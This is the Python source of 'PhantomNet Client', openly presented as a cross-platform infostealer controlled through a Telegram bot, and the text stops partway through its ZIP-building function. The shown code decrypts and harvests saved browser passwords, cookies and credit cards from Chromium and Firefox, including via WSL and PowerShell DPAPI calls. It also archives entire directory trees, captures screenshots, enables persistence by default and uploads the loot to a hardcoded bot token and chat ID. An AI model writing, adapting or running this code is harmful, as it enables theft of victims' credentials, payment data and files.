#!/usr/bin/env python3
"""
PhantomNet Client — Cross-platform Telegram-based browser data exfiltration agent.
Uses HackBrowserData's Go shared library when available, otherwise falls back to
pure-Python extraction for Chromium and Firefox-based browsers.

SETUP:
  1. Set BOT_TOKEN and CHAT_ID below.
  2. Place hackbrowserdata.so / .dll / .dylib next to this script (optional).
  3. Run: python3 phantomnet-client.py

COMMANDS (via Telegram):
  /extract   — Collect all browser data and send as ZIP
  /harvest   — Archive a directory tree into a ZIP
  /info      — System information
  /browsers  — List detected browsers
  /screenshot— Capture a screenshot
  /status    — Bot status + uptime
  /help      — Command list
"""

# ========================= CONFIGURATION =========================
BOT_TOKEN = "8225258770:AAHj-43qkE5iKXh9sH99G3gHYVkW7F2g3iM"
CHAT_ID   = "7688146873"

CHECK_INTERVAL = 0        # seconds between auto-extractions; 0 = disabled
AUTO_PERSIST   = True     # install persistence on first run
# =================================================================

import os
import sys
import json
import base64
import shutil
import sqlite3
import tempfile
import zipfile
import platform
import subprocess
import ctypes
import time
import threading
import atexit
from pathlib import Path
from datetime import datetime

# ── dependency bootstrap ──
def _pip(*pkgs):
    try:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "-q", "--user"] + list(pkgs),
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120,
        )
    except Exception:
        pass

try:
    import requests
except ImportError:
    _pip("requests")
    import requests

try:
    from Crypto.Cipher import AES, DES3
    from Crypto.Util.Padding import unpad
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Hash import SHA1, SHA256
except ImportError:
    _pip("pycryptodome")
    from Crypto.Cipher import AES, DES3
    from Crypto.Util.Padding import unpad
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Hash import SHA1, SHA256

_START_TIME = time.time()
_PLAT = platform.system()

_WSL = None

def _is_wsl():
    global _WSL
    if _WSL is None:
        try:
            with open('/proc/version', 'r') as f:
                _WSL = 'microsoft' in f.read().lower()
        except Exception:
            _WSL = False
    return _WSL


def _dpapi_decrypt_wsl(encrypted_bytes):
    """Decrypt DPAPI-protected bytes from WSL2 using PowerShell."""
    try:
        b64_input = base64.b64encode(encrypted_bytes).decode('ascii')
        ps_script = (
            'Add-Type -AssemblyName System.Security;'
            f'$enc=[System.Convert]::FromBase64String("{b64_input}");'
            '$dec=[System.Security.Cryptography.ProtectedData]'
            '::Unprotect($enc,$null,"CurrentUser");'
            '[System.Convert]::ToBase64String($dec)'
        )
        result = subprocess.run(
            ['powershell.exe', '-NoProfile', '-NonInteractive', '-Command', ps_script],
            capture_output=True, text=True, timeout=30
        )
        if result.returncode == 0 and result.stdout.strip():
            return base64.b64decode(result.stdout.strip())
    except Exception as e:
        print(f'[DPAPI-WSL] Error: {e}')
    return None

# ========================= GO SHARED LIBRARY ======================

_go_lib = None

def _load_go_lib():
    global _go_lib
    script_dir = Path(__file__).resolve().parent
    names = {
        "Windows": "hackbrowserdata.dll",
        "Linux":   "hackbrowserdata.so",
        "Darwin":  "hackbrowserdata.dylib",
    }
    lib_name = names.get(_PLAT)
    if not lib_name:
        return
    lib_path = script_dir / lib_name
    if not lib_path.exists():
        return
    try:
        lib = ctypes.CDLL(str(lib_path))
        lib.GetAllBrowserData.restype = ctypes.c_char_p
        lib.FreeString.argtypes = [ctypes.c_char_p]
        _go_lib = lib
    except OSError:
        pass

_load_go_lib()


def go_extract_all():
    """Use the Go shared library to extract all browser data. Returns dict or None."""
    if _go_lib is None:
        return None
    try:
        ptr = _go_lib.GetAllBrowserData()
        raw = ctypes.string_at(ptr)
        _go_lib.FreeString(ptr)
        return json.loads(raw)
    except Exception:
        return None

# ========================= TELEGRAM API ===========================

_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
_FILE_LIMIT = 49 * 1024 * 1024


def _tg(method, **kwargs):
    url = f"{_API}/{method}"
    for attempt in range(5):
        try:
            r = requests.post(url, timeout=60, **kwargs)
            data = r.json()
            if not data.get('ok'):
                desc = data.get('description', 'unknown error')
                code = data.get('error_code', '?')
                print(f'[TG] {method} failed ({code}): {desc}')
            return data
        except Exception as e:
            print(f'[TG] {method} attempt {attempt+1} error: {e}')
            time.sleep(min(2 ** attempt, 30))
    return None


def delete_webhook():
    """Remove any existing webhook so getUpdates polling works."""
    result = _tg('deleteWebhook', data={'drop_pending_updates': False})
    if result and result.get('ok'):
        print('[TG] Webhook cleared — polling mode active')
    else:
        print('[TG] Warning: deleteWebhook call failed')


def send_message(text, chat_id=None):
    cid = chat_id or CHAT_ID
    for i in range(0, max(1, len(text)), 4096):
        _tg("sendMessage", data={
            "chat_id": cid, "text": text[i:i + 4096], "parse_mode": "HTML",
        })


def send_file(path, chat_id=None, caption=None):
    cid = chat_id or CHAT_ID
    try:
        size = os.path.getsize(path)
        if size <= _FILE_LIMIT:
            with open(path, "rb") as fh:
                return _tg("sendDocument",
                           data={"chat_id": cid, "caption": caption or ""},
                           files={"document": (os.path.basename(path), fh)})
        part_size = _FILE_LIMIT
        part_num = 0
        with open(path, "rb") as fh:
            while True:
                chunk = fh.read(part_size)
                if not chunk:
                    break
                part_num += 1
                part_name = f"{os.path.basename(path)}.part{part_num:02d}"
                part_path = Path(tempfile.gettempdir()) / part_name
                try:
                    part_path.write_bytes(chunk)
                    with open(part_path, "rb") as pf:
                        _tg("sendDocument",
                            data={"chat_id": cid, "caption": f"{caption or 'File'} (part {part_num})"},
                            files={"document": (part_name, pf)})
                finally:
                    try:
                        part_path.unlink()
                    except Exception:
                        pass
        send_message(f"Split into {part_num} parts. Reassemble with: cat *.part* > file.zip", cid)
        return None
    except Exception as e:
        send_message(f"Upload error: {e}", cid)
        return None


def get_updates(offset=None):
    url = f"{_API}/getUpdates"
    params = {"timeout": 30}
    if offset is not None:
        params["offset"] = offset
    for attempt in range(3):
        try:
            r = requests.get(url, params=params, timeout=35)
            data = r.json()
            if not data.get('ok'):
                desc = data.get('description', 'unknown')
                print(f'[TG] getUpdates failed: {desc}')
                return None
            return data
        except Exception as e:
            print(f'[TG] getUpdates attempt {attempt+1} error: {e}')
            time.sleep(2 ** attempt)
    return None


def _is_authorized(chat_id):
    return str(chat_id) == str(CHAT_ID)

# ========================= SYSTEM INFO ============================


def system_info():
    username = "unknown"
    try:
        username = os.getlogin()
    except Exception:
        username = os.environ.get("USER") or os.environ.get("LOGNAME") or os.environ.get("USERNAME") or "unknown"
    return {
        "platform":  _PLAT,
        "release":   platform.release(),
        "arch":      platform.machine(),
        "hostname":  platform.node() or "unknown",
        "username":  username,
        "home":      str(Path.home()),
        "python":    sys.version.split()[0],
        "go_lib":    "loaded" if _go_lib else "not available",
    }

# ========================= BROWSER PATHS ==========================


def find_browser_paths():
    """Return {name: [profile_paths]} for Chromium, {name: base_dir} for Firefox."""
    home = Path.home()
    chromium_bases = {}
    firefox_bases = {}

    if _PLAT == "Linux":
        cfg = home / ".config"
        chromium_bases = {
            "chrome":           cfg / "google-chrome",
            "chrome-beta":      cfg / "google-chrome-beta",
            "chromium":         cfg / "chromium",
            "chromium-snap":    home / "snap/chromium/common/chromium",
            "edge":             cfg / "microsoft-edge",
            "brave":            cfg / "BraveSoftware/Brave-Browser",
            "opera":            cfg / "opera",
            "vivaldi":          cfg / "vivaldi",
            "yandex":           cfg / "yandex-browser",
        }
        firefox_bases = {
            "firefox":          home / ".mozilla/firefox",
            "firefox-snap":     home / "snap/firefox/common/.mozilla/firefox",
            "librewolf":        home / ".librewolf",
            "waterfox":         home / ".waterfox",
        }

    elif _PLAT == "Darwin":
        app_sup = home / "Library" / "Application Support"
        chromium_bases = {
            "chrome":           app_sup / "Google/Chrome",
            "chrome-beta":      app_sup / "Google/Chrome Beta",
            "chromium":         app_sup / "Chromium",
            "edge":             app_sup / "Microsoft Edge",
            "brave":            app_sup / "BraveSoftware/Brave-Browser",
            "opera":            app_sup / "com.operasoftware.Opera",
            "vivaldi":          app_sup / "Vivaldi",
            "yandex":           app_sup / "Yandex/YandexBrowser",
        }
        firefox_bases = {
            "firefox":          home / "Library/Application Support/Firefox",
        }

    elif _PLAT == "Windows":
        local = Path(os.environ.get("LOCALAPPDATA", ""))
        roaming = Path(os.environ.get("APPDATA", ""))
        chromium_bases = {
            "chrome":           local / "Google/Chrome/User Data",
            "chrome-beta":      local / "Google/Chrome Beta/User Data",
            "chromium":         local / "Chromium/User Data",
            "edge":             local / "Microsoft/Edge/User Data",
            "brave":            local / "BraveSoftware/Brave-Browser/User Data",
            "opera":            roaming / "Opera Software/Opera Stable",
            "vivaldi":          local / "Vivaldi/User Data",
            "yandex":           local / "Yandex/YandexBrowser/User Data",
        }
        firefox_bases = {
            "firefox":          roaming / "Mozilla/Firefox",
        }

    result = {}
    for name, base in chromium_bases.items():
        if not base.exists():
            continue
        profiles = []
        try:
            for item in base.iterdir():
                if item.is_dir() and (item.name == "Default" or item.name.startswith("Profile ")):
                    profiles.append(item)
        except PermissionError:
            continue
        if profiles:
            result[name] = profiles

    for name, base in firefox_bases.items():
        if base.exists():
            result[name] = base

    if _PLAT == "Linux" and _is_wsl():
        try:
            for user_dir in Path('/mnt/c/Users').iterdir():
                if user_dir.name in ('Public', 'Default', 'Default User',
                                     'All Users', 'desktop.ini'):
                    continue
                if not user_dir.is_dir():
                    continue
                local   = user_dir / 'AppData' / 'Local'
                roaming = user_dir / 'AppData' / 'Roaming'
                wsl_chromium = {
                    'edge-wsl':    local / 'Microsoft/Edge/User Data',
                    'chrome-wsl':  local / 'Google/Chrome/User Data',
                    'brave-wsl':   local / 'BraveSoftware/Brave-Browser/User Data',
                    'opera-wsl':   roaming / 'Opera Software/Opera Stable',
                    'vivaldi-wsl': local / 'Vivaldi/User Data',
                }
                wsl_firefox = {
                    'firefox-wsl': roaming / 'Mozilla/Firefox',
                }
                for wname, wbase in wsl_chromium.items():
                    if not wbase.exists():
                        continue
                    profiles = []
                    try:
                        for item in wbase.iterdir():
                            if item.is_dir() and (
                                item.name == 'Default'
                                or item.name.startswith('Profile ')
                            ):
                                profiles.append(item)
                    except PermissionError:
                        continue
                    if profiles:
                        result[wname] = profiles
                for wname, wbase in wsl_firefox.items():
                    if wbase.exists():
                        result[wname] = wbase
        except Exception as e:
            print(f'[WSL] Error scanning Windows browsers: {e}')

    return result


def find_firefox_profiles(base_path):
    ini = base_path / "profiles.ini"
    profiles = []
    if ini.exists():
        try:
            import configparser
            cfg = configparser.ConfigParser()
            cfg.read(ini)
            for section in cfg.sections():
                if not section.lower().startswith("profile"):
                    continue
                path_val = cfg.get(section, "Path", fallback=None)
                if path_val is None:
                    continue
                is_rel = cfg.getint(section, "IsRelative", fallback=1)
                p = (base_path / path_val) if is_rel else Path(path_val)
                if p.exists():
                    profiles.append(p)
        except Exception:
            pass
    if not profiles:
        try:
            for item in base_path.iterdir():
                if item.is_dir() and ".default" in item.name:
                    profiles.append(item)
        except Exception:
            pass
    return profiles

# ================== CHROMIUM DECRYPTION (CROSS-PLATFORM) ==========


def chromium_master_key(browser_base=None):
    if _PLAT == "Linux":
        if _is_wsl() and browser_base and str(browser_base).startswith('/mnt/'):
            local_state = browser_base / "Local State"
            if local_state.exists():
                try:
                    data = json.loads(local_state.read_text(encoding="utf-8"))
                    enc_key_b64 = data["os_crypt"]["encrypted_key"]
                    enc_key = base64.b64decode(enc_key_b64)
                    if enc_key[:5] == b"DPAPI":
                        enc_key = enc_key[5:]
                    key = _dpapi_decrypt_wsl(enc_key)
                    if key:
                        return key
                    print("[master_key] DPAPI via PowerShell failed")
                except Exception as e:
                    print(f"[master_key] WSL key extraction error: {e}")
                return None
        return PBKDF2(b"peanuts", b"saltysalt", dkLen=16, count=1, hmac_hash_module=SHA1)

    if _PLAT == "Darwin":
        try:
            proc = subprocess.run(
                ["security", "find-generic-password", "-wa", "Chrome Safe Storage"],
                capture_output=True, text=True, timeout=10,
            )
            if proc.returncode == 0 and proc.stdout.strip():
                pwd = proc.stdout.strip().encode("utf-8")
                return PBKDF2(pwd, b"saltysalt", dkLen=16, count=1003, hmac_hash_module=SHA1)
        except Exception:
            pass
        return None

    if _PLAT == "Windows" and browser_base:
        local_state = browser_base / "Local State"
        if not local_state.exists():
            return None
        try:
            import win32crypt  # type: ignore
            data = json.loads(local_state.read_text(encoding="utf-8"))
            encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # strip DPAPI prefix
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception:
            return None

    return None


def chromium_decrypt(blob, key):
    if not blob or not key:
        return ""
    try:
        if blob[:3] == b"v20":
            return ""
        if blob[:3] in (b"v10", b"v11") and len(key) == 32:
            nonce      = blob[3:15]
            ct_and_tag = blob[15:]
            ciphertext = ct_and_tag[:-16]
            tag        = ct_and_tag[-16:]
            cipher     = AES.new(key, AES.MODE_GCM, nonce=nonce)
            try:
                return cipher.decrypt_and_verify(ciphertext, tag).decode(
                    "utf-8", errors="replace")
            except ValueError:
                return cipher.decrypt(ciphertext).decode(
                    "utf-8", errors="replace").rstrip("\x00")

        if blob[:3] in (b"v10", b"v11"):
            blob = blob[3:]
        cipher = AES.new(key, AES.MODE_CBC, b" " * 16)
        return unpad(cipher.decrypt(blob), 16).decode("utf-8", errors="replace")
    except Exception:
        return "[decryption failed]"


def _chrome_ts(ts):
    if not ts or ts <= 0:
        return None
    try:
        return datetime.fromtimestamp((ts - 11_644_473_600_000_000) / 1_000_000)
    except (OSError, ValueError, OverflowError):
        return None

# ========================= DB HELPER ==============================


def _wsl_copy(src, dst):
    """Copy a file via PowerShell when WSL can't access it (browser lock)."""
    try:
        win_src = subprocess.run(
            ['wslpath', '-w', str(src)], capture_output=True, text=True, timeout=5
        ).stdout.strip()
        win_dst = subprocess.run(
            ['wslpath', '-w', str(dst)], capture_output=True, text=True, timeout=5
        ).stdout.strip()
        if not win_src or not win_dst:
            return False
        ps = f'Copy-Item -LiteralPath "{win_src}" -Destination "{win_dst}" -Force'
        r = subprocess.run(
            ['powershell.exe', '-NoProfile', '-NonInteractive', '-Command', ps],
            capture_output=True, text=True, timeout=15
        )
        return r.returncode == 0 and dst.exists()
    except Exception:
        return False


def _with_db(src, callback):
    tmp = Path(tempfile.gettempdir()) / f"pn_{os.getpid()}_{id(callback)}_{src.name}"
    try:
        try:
            shutil.copy2(src, tmp)
        except PermissionError:
            if _is_wsl() and not _wsl_copy(src, tmp):
                raise
        for suffix in ('-wal', '-shm'):
            sidecar = src.parent / (src.name + suffix)
            if sidecar.exists():
                try:
                    shutil.copy2(sidecar, tmp.parent / (tmp.name + suffix))
                except PermissionError:
                    if _is_wsl():
                        _wsl_copy(sidecar, tmp.parent / (tmp.name + suffix))
        conn = sqlite3.connect(str(tmp))
        try:
            return callback(conn.cursor())
        finally:
            conn.close()
    except Exception as e:
        print(f"[_with_db] Error reading {src}: {e}")
        return []
    finally:
        for suffix in ('', '-wal', '-shm'):
            try:
                (tmp.parent / (tmp.name + suffix)).unlink()
            except Exception:
                pass

# =================== CHROMIUM EXTRACTORS ==========================


def get_chromium_passwords(profile, key):
    db = profile / "Login Data"
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                "SELECT origin_url,username_value,password_value,"
                "date_created,date_last_used FROM logins ORDER BY date_last_used DESC"
            )
            for url, user, enc, dc, dlu in cur.fetchall():
                if user and enc:
                    rows.append({
                        "url": url, "username": user,
                        "password": chromium_decrypt(enc, key),
                        "created": str(_chrome_ts(dc) or ""),
                        "last_used": str(_chrome_ts(dlu) or ""),
                    })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_cookies(profile, key):
    db = None
    for p in [profile / "Cookies", profile / "Network" / "Cookies"]:
        if p.exists():
            db = p
            break
    if db is None:
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                "SELECT host_key,name,encrypted_value,path,expires_utc,"
                "is_secure,is_httponly FROM cookies ORDER BY host_key"
            )
            for host, name, enc, path, exp, sec, httpo in cur.fetchall():
                if enc:
                    rows.append({
                        "host": host, "name": name,
                        "value": chromium_decrypt(enc, key),
                        "path": path, "expires": str(_chrome_ts(exp) or ""),
                        "secure": bool(sec), "httponly": bool(httpo),
                    })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_history(profile):
    db = profile / "History"
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                "SELECT url,title,visit_count,last_visit_time "
                "FROM urls ORDER BY last_visit_time DESC LIMIT 1000"
            )
            for url, title, vc, lv in cur.fetchall():
                rows.append({
                    "url": url, "title": title or "",
                    "visits": vc, "last_visit": str(_chrome_ts(lv) or ""),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_bookmarks(profile):
    bm = profile / "Bookmarks"
    if not bm.exists():
        return []
    bookmarks = []
    def _walk(node, folder=""):
        if node.get("type") == "url":
            bookmarks.append({
                "name": node.get("name", ""), "url": node.get("url", ""),
                "folder": folder,
            })
        elif node.get("type") == "folder":
            sub = f"{folder}/{node.get('name', '')}" if folder else node.get("name", "")
            for child in node.get("children", []):
                _walk(child, sub)
    try:
        data = json.loads(bm.read_text(encoding="utf-8"))
        for root in data.get("roots", {}).values():
            if isinstance(root, dict):
                for child in root.get("children", []):
                    _walk(child)
    except Exception:
        pass
    return bookmarks


def get_chromium_credit_cards(profile, key):
    db = profile / "Web Data"
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                "SELECT name_on_card,expiration_month,expiration_year,"
                "card_number_encrypted FROM credit_cards"
            )
            for name, em, ey, enc in cur.fetchall():
                if enc:
                    rows.append({
                        "name": name, "number": chromium_decrypt(enc, key),
                        "expiry": f"{em}/{ey}",
                    })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_downloads(profile):
    db = profile / "History"
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                "SELECT target_path,tab_url,total_bytes,start_time "
                "FROM downloads ORDER BY start_time DESC LIMIT 500"
            )
            for target, url, size, st in cur.fetchall():
                rows.append({
                    "path": target, "url": url,
                    "size": size, "date": str(_chrome_ts(st) or ""),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_chromium_local_storage(profile):
    ls_dir = profile / "Local Storage" / "leveldb"
    if not ls_dir.exists():
        return []
    entries = []
    try:
        for f in ls_dir.iterdir():
            if f.suffix in (".log", ".ldb"):
                try:
                    raw = f.read_bytes()
                    text = raw.decode("utf-8", errors="replace")
                    for line in text.splitlines():
                        line = line.strip()
                        if line and len(line) > 5:
                            entries.append({"file": f.name, "snippet": line[:300]})
                except Exception:
                    pass
    except Exception:
        pass
    return entries[:500]

# ===================== FIREFOX DECRYPTION =========================

_OID_3DES       = "1.2.840.113549.3.7"
_OID_AES256_CBC = "2.16.840.1.101.3.4.1.42"
_OID_HMAC_SHA1  = "1.2.840.113549.2.7"


def _der_next(data, pos):
    tag = data[pos]; pos += 1
    b = data[pos]; pos += 1
    if b < 0x80:
        length = b
    else:
        n = b & 0x7f
        length = int.from_bytes(data[pos:pos + n], "big")
        pos += n
    return tag, data[pos:pos + length], pos + length


def _oid_str(raw):
    parts = [raw[0] // 40, raw[0] % 40]
    acc = 0
    for b in raw[1:]:
        acc = (acc << 7) | (b & 0x7f)
        if not (b & 0x80):
            parts.append(acc)
            acc = 0
    return ".".join(map(str, parts))


def _ff_pbes2_decrypt(blob, password=b""):
    try:
        _, outer, _ = _der_next(blob, 0)
        pos = 0
        _, alg_id, pos = _der_next(outer, pos)
        _, ciphertext, _ = _der_next(outer, pos)

        pos = 0
        _, _oid_raw, pos = _der_next(alg_id, pos)
        _, params, _ = _der_next(alg_id, pos)

        pos = 0
        _, kdf_seq, pos = _der_next(params, pos)
        _, enc_seq, _ = _der_next(params, pos)

        pos = 0
        _, _kdf_oid, pos = _der_next(kdf_seq, pos)
        _, kdf_params, _ = _der_next(kdf_seq, pos)

        pos = 0
        _, salt, pos = _der_next(kdf_params, pos)
        _, iter_raw, pos = _der_next(kdf_params, pos)
        iterations = int.from_bytes(iter_raw, "big")

        key_len = 32
        hmac_mod = SHA256
        if pos < len(kdf_params):
            tag2, val2, pos2 = _der_next(kdf_params, pos)
            if tag2 == 0x02:
                key_len = int.from_bytes(val2, "big")
                if pos2 < len(kdf_params):
                    _, prf_seq, _ = _der_next(kdf_params, pos2)
                    _, prf_oid_r, _ = _der_next(prf_seq, 0)
                    if _oid_str(prf_oid_r) == _OID_HMAC_SHA1:
                        hmac_mod = SHA1
            elif tag2 == 0x30:
                _, prf_oid_r, _ = _der_next(val2, 0)
                if _oid_str(prf_oid_r) == _OID_HMAC_SHA1:
                    hmac_mod = SHA1
                    key_len = 24

        pos = 0
        _, enc_oid_r, pos = _der_next(enc_seq, pos)
        _, iv, _ = _der_next(enc_seq, pos)
        cipher_oid = _oid_str(enc_oid_r)

        key = PBKDF2(password, salt, dkLen=key_len, count=iterations, hmac_hash_module=hmac_mod)
        if cipher_oid == _OID_3DES:
            return DES3.new(key[:24], DES3.MODE_CBC, iv[:8]).decrypt(ciphertext)
        else:
            return AES.new(key[:key_len], AES.MODE_CBC, iv).decrypt(ciphertext)
    except Exception:
        return None


def _ff_extract_cka_value(decrypted_a11):
    if len(decrypted_a11) >= 102:
        return decrypted_a11[70:102], _OID_AES256_CBC
    if len(decrypted_a11) >= 94:
        return decrypted_a11[70:94], _OID_3DES
    if len(decrypted_a11) >= 32:
        return decrypted_a11[-32:], _OID_AES256_CBC
    return None, None


def get_firefox_master_key(profile_path):
    key4 = profile_path / "key4.db"
    if not key4.exists():
        return None, None
    def _q(cur):
        try:
            cur.execute("SELECT item2 FROM metadata WHERE id='password'")
            row = cur.fetchone()
            if not row:
                return None, None
            check = _ff_pbes2_decrypt(bytes(row[0]))
            if check is None or b"password-check" not in check[:20]:
                return None, None
            cur.execute(
                "SELECT name FROM sqlite_master WHERE type='table' AND name='nssPrivate'"
            )
            if not cur.fetchone():
                return None, None
            cur.execute("SELECT a11 FROM nssPrivate")
            for (a11_blob,) in cur.fetchall():
                if not a11_blob:
                    continue
                dec = _ff_pbes2_decrypt(bytes(a11_blob))
                if dec is None:
                    continue
                key, oid = _ff_extract_cka_value(dec)
                if key:
                    return key, oid
        except Exception:
            pass
        return None, None

    tmp = Path(tempfile.gettempdir()) / f"key4_{os.getpid()}.db"
    try:
        shutil.copy2(key4, tmp)
        conn = sqlite3.connect(str(tmp))
        try:
            result = _q(conn.cursor())
        finally:
            conn.close()
        return result if result else (None, None)
    except Exception:
        return None, None
    finally:
        try:
            tmp.unlink()
        except Exception:
            pass


def _ff_decrypt_field(b64_val, key, cipher_oid):
    try:
        blob = base64.b64decode(b64_val)
        _, outer, _ = _der_next(blob, 0)
        pos = 0
        _, enc_info, pos = _der_next(outer, pos)
        _, ciphertext, _ = _der_next(outer, pos)

        pos = 0
        _, oid_r, pos = _der_next(enc_info, pos)
        _, iv, _ = _der_next(enc_info, pos)
        field_oid = _oid_str(oid_r)

        if field_oid == _OID_3DES or cipher_oid == _OID_3DES:
            plain = DES3.new(key[:24], DES3.MODE_CBC, iv[:8]).decrypt(ciphertext)
        else:
            plain = AES.new(key[:32], AES.MODE_CBC, iv).decrypt(ciphertext)

        pad_len = plain[-1]
        if 1 <= pad_len <= 16:
            plain = plain[:-pad_len]
        return plain.decode("utf-8", errors="replace").strip("\x00")
    except Exception:
        return "[encrypted]"

# ===================== FIREFOX EXTRACTORS =========================


def get_firefox_passwords(profile):
    logins_json = profile / "logins.json"
    if not logins_json.exists():
        return []
    key, oid = get_firefox_master_key(profile)
    passwords = []
    try:
        data = json.loads(logins_json.read_text(encoding="utf-8"))
        for login in data.get("logins", []):
            url = login.get("formSubmitURL") or login.get("hostname", "")
            eu = login.get("encryptedUsername", "")
            ep = login.get("encryptedPassword", "")
            if key:
                username = _ff_decrypt_field(eu, key, oid)
                password = _ff_decrypt_field(ep, key, oid)
            else:
                username = "[master password required]"
                password = "[master password required]"
            tc = login.get("timeCreated")
            passwords.append({
                "url": url, "username": username, "password": password,
                "created": str(datetime.fromtimestamp(tc / 1000)) if tc else "",
            })
    except Exception:
        pass
    return passwords


def get_firefox_cookies(profile):
    db = profile / "cookies.sqlite"
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                "SELECT host,name,value,path,expiry,isSecure,isHttpOnly "
                "FROM moz_cookies ORDER BY host"
            )
            for host, name, val, path, exp, sec, httpo in cur.fetchall():
                rows.append({
                    "host": host, "name": name, "value": val or "",
                    "path": path,
                    "expires": str(datetime.fromtimestamp(exp)) if exp else "",
                    "secure": bool(sec), "httponly": bool(httpo),
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_firefox_history(profile):
    db = profile / "places.sqlite"
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                "SELECT url,title,visit_count,last_visit_date "
                "FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000"
            )
            for url, title, vc, lv in cur.fetchall():
                rows.append({
                    "url": url, "title": title or "", "visits": vc,
                    "last_visit": str(datetime.fromtimestamp(lv / 1_000_000)) if lv else "",
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)


def get_firefox_bookmarks(profile):
    db = profile / "places.sqlite"
    if not db.exists():
        return []
    def _q(cur):
        rows = []
        try:
            cur.execute(
                "SELECT b.title, p.url, b.dateAdded "
                "FROM moz_bookmarks b "
                "INNER JOIN moz_places p ON b.fk = p.id "
                "WHERE b.type = 1 ORDER BY b.dateAdded DESC"
            )
            for title, url, da in cur.fetchall():
                rows.append({
                    "name": title or "", "url": url,
                    "added": str(datetime.fromtimestamp(da / 1_000_000)) if da else "",
                })
        except Exception:
            pass
        return rows
    return _with_db(db, _q)

# ========================= DATA COLLECTION ========================


def _is_firefox_type(name):
    return any(x in name for x in ("firefox", "librewolf", "waterfox"))


def collect_all_python():
    """Pure-Python extraction across all detected browsers."""
    result = {
        "system": system_info(),
        "browsers": {},
        "timestamp": datetime.now().isoformat(),
    }
    paths = find_browser_paths()
    for browser, path_or_list in paths.items():
        result["browsers"][browser] = {}
        try:
            if _is_firefox_type(browser):
                profiles = find_firefox_profiles(path_or_list)
                for prof in profiles:
                    result["browsers"][browser][prof.name] = {
                        "passwords": get_firefox_passwords(prof),
                        "cookies":   get_firefox_cookies(prof),
                        "history":   get_firefox_history(prof),
                        "bookmarks": get_firefox_bookmarks(prof),
                    }
            else:
                profiles = path_or_list
                browser_base = profiles[0].parent if profiles else None
                key = chromium_master_key(browser_base)
                for prof in profiles:
                    result["browsers"][browser][prof.name] = {
                        "passwords":    get_chromium_passwords(prof, key),
                        "cookies":      get_chromium_cookies(prof, key),
                        "history":      get_chromium_history(prof),
                        "bookmarks":    get_chromium_bookmarks(prof),
                        "credit_cards": get_chromium_credit_cards(prof, key),
                        "downloads":    get_chromium_downloads(prof),
                    }
        except Exception as e:
            result["browsers"][browser]["error"] = str(e)
    return result


def collect_all():
    """Try Go shared library first, fall back to pure Python."""
    go_data = go_extract_all()
    if go_data and "error" not in go_data:
        return {
            "system": system_info(),
            "browsers": go_data,
            "timestamp": datetime.now().isoformat(),
            "method": "go_shared_lib",
        }
    py_data = collect_all_python()
    py_data["method"] = "python_native"
    return py_data


def _count(data, key):
    n = 0
    for pdict in data.get("browsers", {}).values():
        if isinstance(pdict, dict):
            for pdata in pdict.values():
                if isinstance(pdata, dict):
                    n += len(pdata.get(key, []))
                elif isinstance(pdata, list):
                    n += len(pdata)
    return n

# ========================= HARVEST ================================


def harvest_directory(source_path=None, output_file=None):
    """Archive all files from a directory tree into a ZIP (mirrors Go harvest module)."""
    if source_path is None:
        source_path = "C:\\" if _PLAT == "Windows" else "/"
    if output_file is None:
        hostname = platform.node() or "harvest"
        output_file = str(Path(tempfile.gettempdir()) / f"{hostname}_harvest.zip")

    src = Path(source_path)
    if not src.is_dir():
        return None, f"Not a directory: {source_path}"

    added = 0
    skipped = 0
    try:
        with zipfile.ZipFile(output_file, "w", zipfile.ZIP_DEFLATED) as zf:
            for root, _dirs, files in os.walk(str(src)):
                for fname in files:
                    fpath = os.path.join(root, fname)
                    try:
                        rel = os.path.relpath(fpath, str(src))
                        zf.write(fpath, rel)
                        added += 1
                    except Exception:
                        skipped += 1
        size_mb = os.path.getsize(output_file) / (1024 * 1024)
        return output_file, f"Added: {added}, Skipped: {skipped}, Size: {size_mb:.2f} MB"
    except Exception as e:
        return None, str(e)

# ========================= SCREENSHOT =============================


def capture_screenshot():
    tmp = Path(tempfile.gettempdir()) / f"screenshot_{int(time.time())}.png"
    try:
        if _PLAT == "Windows":
            try:
                from PIL import ImageGrab  # type: ignore
                img = ImageGrab.grab()
                img.save(str(tmp))
                return str(tmp)
            except ImportError:
                pass
        elif _PLAT == "Linux":
            for tool in ["gnome-screenshot", "scrot", "import"]:
                if shutil.which(tool):
                    if tool == "gnome-screenshot":
                        subprocess.run([tool, "-f", str(tmp)], timeout=10,
                                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    elif tool == "scrot":
                        subprocess.run([tool, str(tmp)], timeout=10,
                                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    elif tool == "import":
                        subprocess.run([tool, "-window", "root", str(tmp)], timeout=10,
                                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    if tmp.exists():
                        return str(tmp)
        elif _PLAT == "Darwin":
            subprocess.run(["screencapture", "-x", str(tmp)], timeout=10,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if tmp.exists():
                return str(tmp)
    except Exception:
        pass
    return None

# ========================= ZIP BUILDER ============================


def make_zip(data):
    tmp_dir = Path(tempfile.mkdtemp())
    try:
        files = {}
